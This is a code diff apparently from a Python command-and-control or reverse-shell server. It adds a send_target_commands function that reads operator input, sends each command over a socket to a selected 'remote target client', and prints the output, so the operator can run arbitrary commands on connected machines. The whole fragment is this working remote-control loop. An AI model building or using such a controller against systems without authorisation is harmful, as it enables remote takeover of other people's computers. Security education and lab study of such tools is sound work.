@@ -119,3 +119,18 @@ def get_target(cmd):
     except:
         print('Not a valid selection')
         return None
+
+#connect with remote target client
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd=input()
+            if len(str.encode(cmd)) > 0 :
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(204800),'utf-8')
+                print(client_response,end="")
+            if cmd =='quit':
+                break
+        except:
+            print('connection was lost')
+            break
